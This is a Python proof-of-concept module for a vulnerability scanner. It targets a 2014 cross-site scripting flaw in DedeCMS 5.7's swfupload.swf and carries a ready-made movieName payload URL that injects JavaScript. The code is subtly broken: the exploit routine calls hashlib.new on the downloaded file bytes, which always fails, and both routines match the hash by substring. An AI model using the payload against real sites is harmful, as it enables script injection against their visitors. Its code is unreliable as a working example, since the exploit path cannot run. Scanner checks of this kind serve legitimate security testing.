# coding: utf-8
import hashlib
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0103'  # 平台漏洞编号，留空
    name = 'DedeCMS 5.7 /images/swfupload/swfupload.swf 跨站脚本'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-10-16'  # 漏洞公布时间
    desc = '''
    DedeCMS 5.7 /images/swfupload/swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。
    '''  # 漏洞描述
    ref = 'http://wooyun.org/bugs/wooyun-2010-038593'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = '5.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a2584ba9-8aa4-4d90-a806-e4305aeda0e1'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"
            file_path = "/images/swfupload/swfupload.swf"
            verify_url = self.target + file_path
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            md5_value = hashlib.md5(content).hexdigest()
            vul_url = verify_url + \
                r'?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%221%22%29}}//'
            if md5_value in flash_md5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"
            file_path = "/images/swfupload/swfupload.swf"
            verify_url = self.target + file_path
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            md5_value = hashlib.new(content).hexdigest()
            vul_url = verify_url + \
                r'?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%221%22%29}}//'
            if md5_value in flash_md5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取到的信息:vul_url={vul_url}'.format(
                    target=self.target, name=self.vuln.name, vul_url=vul_url))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
